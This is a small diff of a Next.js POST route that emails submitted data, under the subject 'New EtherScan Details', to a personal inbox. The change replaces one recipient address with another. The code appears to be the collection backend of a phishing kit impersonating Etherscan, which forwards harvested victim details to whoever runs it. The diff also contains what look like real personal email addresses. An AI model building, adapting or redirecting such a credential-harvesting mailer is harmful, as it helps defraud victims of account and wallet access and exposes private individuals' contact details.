@@ -22,7 +22,7 @@ export async function POST(request: NextRequest) {
     });
     sendMail({
       from: "random@fonu.com",
-      to: "fretking24@proton.me",
+      to: "sokoyanifemi@gmail.com",
       subject: "New EtherScan Details",
       html: `
         <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
